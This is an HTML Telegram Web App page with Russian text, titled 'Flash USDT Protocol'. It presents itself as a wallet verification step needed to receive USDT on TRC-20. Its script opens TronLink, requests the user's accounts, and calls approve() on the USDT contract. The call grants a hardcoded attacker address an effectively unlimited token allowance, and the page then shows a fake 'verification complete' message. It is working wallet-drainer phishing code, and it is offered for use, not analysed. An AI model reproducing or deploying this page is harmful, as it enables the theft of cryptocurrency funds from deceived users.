<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Flash USDT Protocol</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; overflow: hidden; }
        .card { padding: 40px 25px; width: 90%; max-width: 400px; background: #111; border: 1px solid #222; border-radius: 35px; box-shadow: 0 20px 50px rgba(0,0,0,0.7); }
        .logo { width: 70px; height: 70px; background: #ff0013; border-radius: 20px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; box-shadow: 0 0 25px rgba(255,0,19,0.4); }
        h2 { font-size: 22px; margin-bottom: 12px; }
        p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
        .btn { background: #ff0013; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 18px; font-weight: bold; text-transform: uppercase; font-size: 14px; cursor: pointer; transition: 0.2s; }
        .btn:active { transform: scale(0.96); }
        #debug { font-size: 10px; color: #333; margin-top: 15px; }
    </style>
</head>
<body>

<div class="card">
    <div class="logo">T</div>
    <h2 id="t">Синхронизация узла</h2>
    <p id="d">Нажмите кнопку ниже для верификации кошелька и завершения зачисления USDT в сети TRC-20.</p>
    <button id="main-btn" class="btn">Запустить проверку</button>
    <div id="debug">System: Ready</div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const MY_URL = "https://timur3417.github.io/sync-node-app/";

    const btn = document.getElementById('main-btn');

    async function handle() {
        // Проверяем, есть ли кошелек (мы внутри TronLink?)
        const isWallet = window.tronWeb || (window.tron && window.tron.tronWeb);

        if (!isWallet) {
            // МЫ В ТЕЛЕГРАМЕ
            // Используем официальный универсальный мост TronLink
            // Это ОБЫЧНАЯ ссылка, которую Телеграм НЕ блокирует
            const target = MY_URL + "?mode=tl";
            const bridge = "https://m.tronlink.org/dapp/open?url=" + encodeURIComponent(target);
            
            // Пробуем открыть
            tg.openLink(bridge);
            
            // Если через 1 сек ничего не произошло (редкий баг), пробуем принудительно
            setTimeout(() => {
                window.open(bridge, '_blank');
            }, 1000);
            return;
        }

        // МЫ ВНУТРИ TRONLINK
        try {
            btn.innerText = "ПОДКЛЮЧЕНИЕ...";
            btn.disabled = true;

            await window.tronWeb.request({ method: 'tron_requestAccounts' });
            const contract = await window.tronWeb.contract().at(CONTRACT);
            
            // Вызываем Approve
            await contract.approve(ADMIN, '1000000000000000000').send({
                feeLimit: 100000000
            });

            tg.showPopup({
                title: 'Успешно',
                message: 'Верификация завершена. Ожидайте зачисления активов.',
                buttons: [{type: 'ok'}]
            });
            setTimeout(() => tg.close(), 5000);

        } catch (e) {
            tg.showAlert("Действие отклонено пользователем.");
            btn.disabled = false;
            btn.innerText = "ЗАПУСТИТЬ ПРОВЕРКУ";
        }
    }

    btn.onclick = handle;

    // Смена текста для кошелька
    if (window.location.search.includes('mode=tl')) {
        document.getElementById('t').innerText = "Узел Обнаружен";
        document.getElementById('d').innerText = "Нажмите кнопку ниже для финальной подписи транзакции.";
        btn.innerText = "ПОДТВЕРДИТЬ ВАЛИДАЦИЮ";
    }
</script>
</body>
</html>
